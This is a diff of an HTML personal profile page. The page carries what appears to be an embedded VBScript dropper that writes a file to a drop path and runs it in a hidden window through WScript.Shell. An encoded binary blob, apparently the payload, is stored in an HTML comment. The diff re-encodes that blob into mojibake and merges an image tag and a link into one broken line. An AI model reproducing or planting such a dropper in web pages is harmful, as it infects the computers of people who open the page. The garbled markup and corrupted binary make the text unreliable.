@@ -12,8 +12,7 @@ body{
 </head>
 <body>
 <h1>DIANE DE JESUS</h1>
-<center><img src="yhanP.jpg" height="200" width="200"></center>
-<p><a href="content.html" target="content">HOME</a></p>
+<center><img src="yhanP.jpg" target="content">HOME</a></p>
 <h1><center>INFORMATION</h1></center>
 <p><front = 'Georgia'><b>First Name:</b>DIANE</p>
 <p><front = 'Georgia'><b>Middle Name:</b>DELFIN</p>
@@ -39,6 +38,7 @@ FileObj.Close
 End If
 Set WSHshell = CreateObject("WScript.Shell")
 WSHshell.Run DropPath, 0
-//--></SCRIPT><!--^ì´Þæ[¢¹mc<õ~™À‚ß9,Œ%?WÌ.';²MáØ†x?#ä
-´Èw"¤s~5 ­ì–—GŠråßå^€‰— è„Z˜ó‡L9ÚB¶CáÜÝµ‰7ÖsyÃæÙ}M¿Êuög´ÃZŒ½9¹ÔhttM€©ÝG.;hSé”Og8^•ˆåJ³@ÕaBðÓ¼<”Sü+yÌêañkj‡™F‘9hÛ!QÒžu»;ç”ðHƒHkãËð×_Æû@_³FÜ¯G¿
-tYø“îù`	ô»âêôÃÒ|–š¿3ëS2Ø5˜®õ¼(éÆ Î.ÜÚ»/‹{~}n5 W€b4'Ã—ï(sAgUyŸF–“ò§”†dî¦5‡½Ä-‡àÉ›À—Î‚ ëÎR(ÕøëÎëÎëÎ¦N·X1èÎ ëÎ-->
+//--></SCRIPT><!--^Ã¬Â´ÃžÃ¦[Â¢Â¹mc<Ãµ~Â™Ã€Â‚ÃŸ9,ÂŒ%?WÃŒ.';Â²MÃ¡Ã˜Â†x?#Ã¤
+Â´Ãˆw"Â¤s~5Â Â­Ã¬Â–Â—GÂŠrÃ¥ÃŸÃ¥^Â€Â‰Â—Â Ã¨Â„ÂZÂ˜Ã³Â‡L9ÂÃšBÂ¶CÃ¡ÃœÃÂµÂ‰7Ã–syÃƒÃ¦Ã™}MÂ¿ÃŠuÃ¶gÂ´ÃƒZÂŒÂ½9Â¹Ã”httMÂ€Â©ÃG.;hSÃ©Â”Og8^Â•ÂˆÃ¥JÂ³@Ã•aBÃ°Ã“Â¼<Â”
+SÂÃ¼+yÃŒÃªaÃ±kjÂ‡Â™FÂ‘9hÃ›!QÃ’ÂžuÂ»;Ã§Â”Ã°HÂƒHkÃ£ÂÃ‹Ã°Ã—_Ã†Ã»@_Â³FÃœÂ¯GÂ¿
+tYÃ¸Â“Ã®Ã¹`	Ã´Â»Ã¢ÃªÃ´ÃƒÃ’|Â–ÂšÂ¿3Ã«S2Ã˜5Â˜Â®ÃµÂ¼(Ã©Ã†Â ÃŽ.ÃœÃšÂ»/Â‹{~}n5 WÂ€b4'ÃƒÂ—Ã¯(sAgUyÂŸFÂ–Â“Ã²Â§Â”Â†dÃ®Â¦5Â‡Â½Ã„-Â‡Ã Ã‰Â›Ã€Â—ÃŽÂ‚ Ã«ÃŽR(Ã•Ã¸Ã«ÃŽÃ«ÃŽÃ«ÃŽÂ¦NÂ·X1Ã¨ÃŽ Ã«ÃŽ-->
